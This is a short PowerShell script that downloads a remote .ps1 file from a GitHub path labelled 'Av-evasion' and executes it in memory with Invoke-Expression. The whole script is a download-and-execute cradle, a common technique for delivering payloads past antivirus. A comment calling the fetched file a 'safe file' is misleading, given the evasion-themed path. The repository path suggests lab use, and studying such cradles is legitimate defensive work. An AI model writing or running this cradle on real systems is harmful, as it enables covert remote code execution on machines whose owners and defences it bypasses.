# URL to download safe file
$scriptUrl = "https://github.com/salahgeek/LAB/blob/main/LAS/Av-evasion/8443.ps1"
# Download script
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
$scriptContent = [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content)
# Run the script
Invoke-Expression -Command $scriptContent





